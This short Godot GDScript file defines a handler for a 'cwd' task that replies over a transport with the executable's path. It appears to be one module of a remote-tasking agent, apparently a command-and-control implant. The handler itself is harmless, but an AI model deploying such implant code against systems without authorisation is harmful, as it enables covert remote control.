extends Node

func _on_tasking_cwd(transport, task):

	transport.send(
		transport.create_task_response(
			true,
			true,
			task.get("id"),
			OS.get_executable_path()
		)
	)
